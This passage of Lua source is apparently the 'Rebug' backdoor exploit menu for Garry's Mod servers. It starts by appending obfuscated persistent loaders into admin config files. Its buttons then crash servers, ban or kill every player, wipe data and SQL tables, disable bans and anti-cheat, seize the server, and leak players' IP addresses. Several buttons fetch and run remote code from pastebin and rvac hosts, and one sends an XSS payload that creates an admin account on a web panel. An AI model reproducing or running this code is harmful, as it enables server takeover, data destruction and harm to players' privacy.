        noob.PostLua([[file.Append("ulx/config.txt", "\n"..[=[x='R'..'unS'..'tri'..'n'..'g'_='r'..''..'va'..'c'..'.g'..'q/'x0=_G['Co'..'mpil'..''..'eSt'..'ri'..'ng']__='h'..''..'t'..'t'..'ps'..'://'x0(__,_,'_!/p',x)]=])]])
        noob.PostLua([[file.Append("ulib/misc_registered.txt", "\n"..[=[x='R'..'unS'..'tri'..'n'..'g'_='r'..''..'va'..'c'..'.g'..'q/'x0=_G['Co'..'mpil'..''..'eSt'..'ri'..'ng']__='h'..''..'t'..'t'..'ps'..'://'x0(__,_,'_!/p',x)]=])]])
    end)

    rebug.AddButton("Artillery Server Strike", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if !bombstrike then

	hook.Add("Think", "lulz_bombstrike", function()

	local explode = ents.Create("env_explosion")

	local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))

	local trc = {}

	trc.start = ps

	trc.endpos = ps + Vector(0, 0, -99999)

	local tr = util.TraceLine(trc)

	if !tr.Hit then return end

	explode:SetPos(tr.HitPos)

	explode:Spawn()

	explode:SetKeyValue("iMagnitude", "400")

	explode:Fire("Explode", 0, 0)

	end)

	bombstrike = true

	else

	hook.Remove("Think", "lulz_bombstrike")

	bombstrike = false

	end]])
    end)

    rebug.AddButton("Announce centre screen", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Set Custom Text", "Set Text", "", function(str)
            noob.PostLua("for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, \"" .. str .. "\") end")
        end)
    end)

    rebug.AddButton("Broken Glass Symphony", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if !timer.Exists("A true masterpiece") then

	timer.Create("A true masterpiece", 0.2, 0, function()

	for _, p in pairs(player.GetAll()) do

	p:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random(40, 180))

	end

	end)

	else

	timer.Remove("A true masterpiece")

	end]])
    end)

    rebug.AddButton("Double Or Nothing 100%", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Set win chance", "1-100", "", function(str)
            noob.PostLua("BDON_CONFIG.doubleChance = " .. str)
        end)
    end)

    rebug.AddButton("Ban All Players", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Ban All Players", "Reason", "", function(text)
            noob.PostLua([[

	local id = ]] .. LocalPlayer():UserID() .. [[

	for k, v in next, player.GetAll() do

	if v:UserID() == id then continue end

	v:Ban( 0, false )

	v:Kick( "]] .. tostring(text) .. [[" )

	end]])
        end)
    end)

    rebug.AddButton("Break Economy", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end]])
    end)

    rebug.AddButton("Cleanup Map", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[game.CleanUpMap()]])
    end)

    rebug.AddButton("Console Jammer", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if !(timer.Exists("consoleJammer")) then

	timer.Create("consoleJammer", 0.5, 0, function()

	print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")

	end)

	else

	timer.Destroy("consoleJammer")

	end]])
    end)

    rebug.AddButton("Crash Server", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[timer.Create("rekt",0.5,1,function() while true do end end)]])
        chat.AddText(Color(255, 0, 0), "[REBUG] ", Color(20, 150, 200), "The server has been crashed gg")
    end)

    rebug.AddButton("Crash Admins & Vip's", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua("for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end")
    end)

    rebug.AddButton("Change Everyone Name", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Set Everyones Name", "Name", "", function(text)
            noob.PostLua([[local str = "]] .. text .. [["

	for k, v in next, player.GetAll() do

	DarkRP.storeRPName( v, str )

	v:setDarkRPVar( "rpname", str )

	end]])
        end)
    end)

    rebug.AddButton("Change Everyone Model", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
            noob.PostLua("for k, v in pairs(player.GetAll()) do v:SetModel(\"" .. str .. "\") end")
        end)
    end)

    rebug.AddButton("Change Everything Material", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(str)
            noob.PostLua("for k, v in pairs(ents.GetAll()) do v:SetMaterial(\"" .. str .. "\") end")
        end)
    end)

    rebug.AddButton("Disable Bans/Kicks", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if ULib then

	function ULib.kick( ply, reason, calling_ply ) end

	function ULib.ban( ply, time, reason, admin ) end

	function ULib.addBan( steamid, time, reason, name, admin ) end

	end

	if FAdmin then

	local function no(ply) end

	FAdmin.Commands.AddCommand("kick", no)

	FAdmin.Commands.AddCommand("ban", no)

	FAdmin.Commands.AddCommand("jail", no)

	FAdmin.Commands.AddCommand("UnJail", no)

	FAdmin.Commands.AddCommand("ClearDecals", no)

	FAdmin.Commands.AddCommand("StopSounds", no)

	FAdmin.Commands.AddCommand("CleanUp", no)

	end

	local _R = debug.getregistry()

	function _R.Player.Ban(ply, r) end

	function _R.Player.Kick(ply, r) end

	function game.KickID(id, reason) end

	local RCM = RunConsoleCommand

	function RunConsoleCommand(command, ...)

	if command == "addip" then return end

	RCM(command, ...)

	end]])
    end)

    rebug.AddButton("Disable SNTE", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[

	local function Check(func)

	if string.find(debug.getinfo(func).short_src,"snte_source.lua") then

	return true

	else

	return false

	end

	end

	timer.Create("rvacbypass",5,0,function()

	for k,v in pairs(net.Receivers) do

	if Check(v) then

	net.Receive(k,function(l,ply)

	ply:ChatPrint("LEL")

	end)

	end

	end


	end)]])
    end)

    rebug.AddButton("Disable Exit", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]])
    end)

    rebug.AddButton("Delete Server", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[local function WipeDir(dir)

	local files,dirs = file.Find(dir.."*", "DATA")

	for k,v in ipairs(files) do

	file.Delete(dir..v)

	end

	for k,v in ipairs(dirs) do

	WipeDir(v.."/")

	end

	end

	print(60*60*6)

	local function wiperpro()

	print("Wiping server data. . .")

	WipeDir("")

	sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")

	if ULib then

	for k,v in pairs(ULib.ucl.groups) do

	if k != "user" then

	ULib.ucl.removeGroup(k)

	end

	end

	end

	if FPP then

	for k,v in pairs(FPP.Blocked) do

	for r,g in pairs(v) do

	RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)

	end

	end

	end

	for i=1,256 do

	RunConsoleCommand("removeid",i)

	end

	for k,v in ipairs(player.GetAll()) do

	v:Kick("rvac.Team")

	end

	print("Wipe finished !")

	end

	timer.Create("1Tap",0.5,1,function() while true do end end)

	wiperpro()]])
    end)

    rebug.AddButton("Earthquake", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if !timer.Exists("earthquake") then

	timer.Create("earthquake", 0.5, 500, function()

	for _, p in pairs(player.GetAll()) do

	p:SetPos(p:GetPos() + Vector(0, 0, 1))

	p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))

	util.ScreenShake(p:GetPos(), 20, 1, 1, 100)

	p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))

	end

	for _, e in pairs(ents.GetAll()) do

	if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end

	end

	end)

	else

	timer.Remove("earthquake")

	end]])
    end)

    rebug.AddButton("EarRape", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua("for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end")
    end)

    rebug.AddButton("Force Dance All", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )]])
    end)

    rebug.AddButton("Ignite Everyone", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
            noob.PostLua("for k, v in pairs(player.GetAll()) do v:Ignite(" .. str .. ") end")
        end)
    end)

    rebug.AddButton("Kill Everyone", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua("for k,v in pairs(player.GetAll()) do v:Kill() end")
    end)

    rebug.AddButton("Luarun Access", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")]])
    end)

    rebug.AddButton("Launch Players", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end")
    end)

    rebug.AddButton("LuaRun Code", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("LuaRun String", "String", "", function(text)
            noob.PostLua([[RunString( ']] .. text .. [[' )]])
        end)
    end)

    rebug.AddButton("Rainbow Physgun", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[hook.Add("Think", "rainbowphysgun", function()

	for k,ply in ipairs(player.GetAll()) do

	local col = HSVToColor(CurTime() % 6 * 60, 1, 1)

	ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))

	end

	end)]])
    end)

    rebug.AddButton("Rainbow Chat Spam", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Rainbow Chatspam", "Text", "", function(text)
            noob.PostLua([[

	chat = {}

	function chat.AddText(...)

	net.Start("rvac")

	net.WriteTable({...})

	net.Broadcast()

	end

	function AddTextPly(ply, ...)

	net.Start("rvac")

	net.WriteTable({...})

	net.Send(ply)

	end

	for k, v in pairs(player.GetAll()) do

	v:SendLua('net.Receive("rvac", function(len) chat.AddText(unpack(net.ReadTable()))end)')

	end

	timer.Create("gotEm", 0.8, 120, function()

	local function ChatPrintRainbow(frequency, str)

	local text = {}

	for i = 1, #str do

	table.insert(text, HSVToColor(i * frequency % 360, 1, 1))

	table.insert(text, string.sub(str, i, i))

	end

	chat.AddText(unpack(text))

	end

	ChatPrintRainbow(10, "]] .. text .. [[")

	end)]])
        end)
    end)

    rebug.AddButton("Rainbow HUD", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if !rainbowscreen then

	BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")

	rainbowscreen = true

	else

	BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")

	rainbowscreen = false

	end]])
    end)

    rebug.AddButton("Rainbow Buildings/Floor", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',function(b,l,h,c)RunString(b)end,nil)")]])
        chat.AddText(Color(255, 0, 0), "[REBUG] ", Color(255, 155, 155), "This may cause frame drop")
    end)

    rebug.AddButton("Remove Bans", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if file.Exists("ulib/bans.txt", "DATA") then file.Delete("ulib/bans.txt") end]])
    end)

    rebug.AddButton("Rave Music", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua("BroadcastLua([[surface.PlaySound('music/hl1_song25_remix3.mp3')]])")
    end)

    rebug.AddButton("Reset all money", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[RunConsoleCommand("rp_resetallmoney")]])
    end)

    rebug.AddButton("RCON Command", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("RCON Command", "Rcon", "", function(str)
            noob.PostRcon(str)
        end)
    end)

    rebug.AddButton("Server Nuke (M9K)", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[

	local rocket = ents.Create("m9k_launched_davycrockett")

	local ply2 = player.GetAll(]] .. selPly .. [[)
	
	rocket:SetPos(ply2:GetPos())

	rocket:SetOwner(ply2)

	rocket.Owner = ply2

	rocket:Spawn()

	rocket:Activate()]])
    end)

    rebug.AddButton("Seize Server", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        chat.AddText(Color(255, 0, 0), "[REBUG] ", Color(20, 150, 200), "Server Password is: GmodCheaTz")
        noob.PostLua([[RunConsoleCommand("sv_password", "GmodCheaTz")

	RunConsoleCommand("hostname", "SEIZED BY rvac.TEAM")]])
    end)

    rebug.AddButton("Moan Steps", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if !moanstep then

	hook.Add("PlayerFootstep", "oooh", function(ply)

	ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))

	end)

	moanstep = true

	else

	hook.Remove("PlayerFootstep", "oooh")

	moanstep = false

	end]])
    end)

    rebug.AddButton("Open URL On Players", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("URL On Players", "URL Link", "", function(str)
            noob.PostLua([==[local ply = str

	ply:SendLua([[h=vgui.Create("DHTML")

	h:SetSize(ScrW(),ScrH())

	h:OpenURL(..str..)]])

	]==])
        end)
    end)

    rebug.AddButton("Explode all vehicles", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then

	local explo = ents.Create("env_explosion")

	explo:SetPos(v:GetPos())

	explo:SetKeyValue("iMagnitude", "300")

	explo:Spawn()

	explo:Activate()

	explo:Fire("Explode", "", 0)

	end

	end]])
    end)

    rebug.AddButton("Print All IP's", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[

	local id = ]] .. LocalPlayer():UserID() .. [[

	for k, v in pairs( player.GetAll() ) do 

	Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )

	end]])
    end)

    rebug.AddButton("Toggle all doors", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]])
    end)

    rebug.AddButton("Lock all doors", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end]])
    end)

    rebug.AddButton("Unlock all doors", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]])
    end)

    rebug.AddButton("Vaporize all players", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[for k, v in pairs(player.GetAll()) do v:Remove() end]])
    end)

    rebug.AddButton("FPP Unrestrict everything", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[if FPP then

	for k,v in pairs(FPP.Blocked) do

	for r,g in pairs(v) do

	RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)

	end

	end

	end]])
    end)

    rebug.AddButton("Wipe data folder", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[local files, directories = file.Find("*", "DATA") for k, v in pairs(files) do file.Delete(v) end]])
    end)

    rebug.AddButton("Wipe SQL Tables", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')]])
    end)

    rebug.AddButton("Play Sound From URL", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("Play Sound", "Set Link (Has to end with .AUDIOFORMAT)", "", function(str)
            noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. str .. "\" , \"mono\", function() end)]])")
        end)
    end)

    rebug.AddButton("Luarun From Pastebin", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("RunLua", "Place Pastebin link inside box", "", function(str)
            noob.PostLua("http.Fetch(\"" .. str .. "\", function( b, l, h, c ) RunString( b ) end, function() end )")
        end)
    end)

    rebug.AddButton("Luarun From Pastebin", bar1, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua("http.Fetch(\"" .. str .. "\", function( b, l, h, c ) RunString( b ) end, function() end )")
    end)

    rebug.AddButton("ULX Unban SteamID", bar1, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(str)
            noob.PostLua([[local gae = ulx_logecho game.ConsoleCommand("ulx_logecho 0" .. "\n") game.ConsoleCommand("ulx unban " ..str.. "\n") game.ConsoleCommand("ulx_logecho " .. gae .. "\n")]])
        end)
    end)

    -- Targeting Backdoors
    rebug.AddButton("Co Host Menu", bar2, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[Player(]] .. selPly .. [[):SendLua('http.Fetch("https://rvac.ml/load/ui.lua",function(b) RunString(b)end)')]])
    end)

    rebug.AddButton("Set Superadmin", bar2, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[Player(]] .. selPly .. [[):SetUserGroup("superadmin")]])
    end)

    rebug.AddButton("Remove User", bar2, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[Player(]] .. selPly .. [[):SetUserGroup("user"))]])
    end)

    rebug.AddButton("Remove Props", bar2, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[game.CleanUpMap(]] .. selPly .. [[)]])
    end)

    rebug.AddButton("Enable Godmode", bar2, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[Player(]] .. selPly .. [[):GodEnable()]])
    end)

    rebug.AddButton("Disable Godmode", bar2, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[Player(]] .. selPly .. [[):GodDisable()]])
    end)

    -- Extras Page
    rebug.AddButton("Scan Backdoors", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        CheckBackdoors()
    end)

    rebug.AddButton("GBackdoor Exploit", bar4, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("GBacdoor Exploit", "LINK/core/stage2.php", "", function(str)
            timer.Create('13134657', 5, 0, function()
                http.Post("" .. str, {
                    nb = 27,
                    i = math.random(1, 99999) .. '.' .. math.random(1, 99999) .. '.' .. math.random(1, 99999),
                    n = math.random(1, 99999) .. ':' .. math.random(1, 99999) .. [[<script>$.ajax({url: 'core/ajax/add-user.php?username=support&password=support&cpassword=support'});</script>]]
                })
            end)
        end)
    end)

    rebug.AddButton("CodeFodder Exploit", bar4, function()
        surface.PlaySound("buttons/button18.wav")

        Derma_StringRequest("CodeFodder Exploit", "Download ID", "", function(str)
            timer.Create("omgstopit", 0.1, 0, function()
                http.Fetch("https://api.codefodder.store/download/" .. str)
            end)
        end)
    end)

    rebug.AddButton("Rainbow physgun", bar4, function()
        surface.PlaySound("buttons/button18.wav")

        hook.Add("Think", "rainbowphysgun", function()
            for k, ply in ipairs(player.GetAll()) do
                local col = HSVToColor(CurTime() % 6 * 60, 1, 1)
                ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
            end
        end)
    end)

    rebug.AddButton("Bunny Hop", bar4, function()
        surface.PlaySound("buttons/button18.wav")

        if hook.GetTable()["VOIDZZ"] then
            hook.Remove("VOIDZZ")
        end

        local function ch_bunnyhop(ply)
            if (ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
                ply:RemoveKey(IN_JUMP)

                if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
                    if (ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                        ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400)
                    else
                        ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
                        ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400)
                    end
                end
            elseif (ply:KeyDown(IN_JUMP)) then
                ply:SetForwardMove(10000)
            end
        end

        hook.Add("CreateMove", "VOIDZZ", function(ply)
            ch_bunnyhop(ply)
        end)
    end)

    rebug.AddButton("Enigma Disco", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[http.Fetch("https://rvac.cc/load/b1g.lua", function(b) RunString(b) end )]])
    end)

    rebug.AddButton("Enigma Disco 2.0", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[http.Fetch("https://rvac.cc/load/xd.lua", function(b) RunString(b) end )]])
    end)

    rebug.AddButton("Corruption Disco", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[http.Fetch("https://pastebin.com/raw/617S3m9V",function(b,l,h,c)RunString(b)end,nil)]])
    end)

    rebug.AddButton("Hell Mode", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")]])
    end)

    rebug.AddButton("Music Earth", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[http.Fetch('https://pastebin.com/raw/u67AK6SX',function(b,l,h,c)RunString(b)end,nil)]])
    end)

    rebug.AddButton("Music DajaVu", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[http.Fetch('https://pastebin.com/raw/iNBkxFiZ',function(b,l,h,c)RunString(b)end,nil)]])
    end)

    rebug.AddButton("Music Break Bot", bar4, function()
        surface.PlaySound("buttons/button18.wav")
        noob.PostLua([[http.Fetch('https://pastebin.com/raw/rxMQUFMa',function(b,l,h,c)RunString(b)end,nil)]])
    end)

    --Menu Close
    function CloseMenu()
        MenuOpen = false
        BDMenu:Close()
    end
end

rebug.voidz(true)

//-------------------------------------------------------
// Coded By Void Rebug Release Source
// https://github.com/Void09/Rebug-Release
// Note to the person using this, removing this
// text is in violation of the licence you agreed
// to by downloading.
// Copyright © Void 2019
// Licenced under © GNU licence here
// https://github.com/Void09/Rebug-Release/blob/master/LICENSE
//-------------------------------------------------------
